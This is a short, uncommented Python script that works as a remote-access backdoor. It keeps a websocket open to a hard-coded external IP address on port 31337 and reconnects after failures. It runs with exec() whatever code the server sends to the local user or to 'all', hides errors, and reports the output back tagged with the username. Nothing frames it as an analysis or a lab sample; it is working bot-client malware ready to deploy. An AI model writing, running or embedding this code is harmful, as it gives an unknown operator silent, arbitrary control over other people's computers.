import asyncio
import websockets
import json
import getpass
import io
from contextlib import redirect_stdout

username = getpass.getuser()

async def handler():
    while True:
        try:
            async with websockets.connect('ws://91.179.183.243:31337') as websocket:        
                async for message in websocket:
                    received_data = json.loads(message)

                    if received_data['recipient'] == username or received_data['recipient'] == 'all':
                        try:
                            buffer = io.StringIO()

                            with redirect_stdout(buffer):
                                exec(received_data['code'])

                            output = buffer.getvalue()
                            
                            await websocket.send(json.dumps({"sender": username, "output": f"code executed : {output}"}))
                        except:
                            pass
        except:
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(handler())